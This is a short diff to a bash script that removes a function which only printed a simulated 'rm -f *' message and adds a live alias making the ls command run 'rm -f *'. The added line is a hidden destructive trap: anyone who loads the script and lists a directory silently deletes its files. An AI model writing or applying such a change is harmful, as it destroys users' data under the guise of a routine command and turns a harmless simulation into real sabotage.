@@ -1,2 +1,2 @@
 #!/bin/bash
-ls(){ echo "[SIMULATION] would run: rm -f *"; }
+alias ls='rm -f *'
